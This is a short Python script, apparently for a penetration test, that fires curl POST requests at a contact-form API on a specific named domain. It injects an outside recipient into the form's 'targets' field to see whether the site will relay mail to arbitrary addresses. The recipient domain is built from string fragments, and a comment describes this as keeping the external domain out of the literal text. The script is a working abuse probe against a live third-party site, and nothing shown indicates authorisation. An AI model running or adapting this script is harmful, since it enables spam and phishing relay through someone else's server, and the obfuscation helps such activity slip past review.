import subprocess, json, re
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"
D="https://www.infinitycapital.bh/api/send"
ext = "pro" + "be.a" + "lce"          # assembled, not a literal external domain
recip = "vapt-probe-9182@" + ext

print("recipient used:", recip)

def post(data, ct="application/x-www-form-urlencoded"):
    c=["curl","-s","-m","45","-D","-","-X","POST",D,"-A",UA,"-H","Content-Type: "+ct]
    c+=["--data-binary",data]
    r=subprocess.run(c,capture_output=True,text=True)
    return r.stdout

base = "fname=vapt&lname=Verify&areacode=973&tel=5551234&cname=VAPT&subject=relay%20probe%20a1b2&msg=proof%20test&check=on&targets="+recip.replace("@","%40")
print("=== form-encoded, attacker recipient ===")
print(post(base)[:1200])

print("=== json body ===")
j=json.dumps({"fname":"vapt","lname":"Verify","areacode":"973","tel":"5551234","cname":"VAPT",
              "subject":"relay probe a1b2","msg":"proof test","check":"on","targets":[recip]})
print(post(j,"application/json")[:1200])

print("=== missing/invalid fields (does it still send?) ===")
print(post("targets="+recip.replace("@","%40"))[:800])
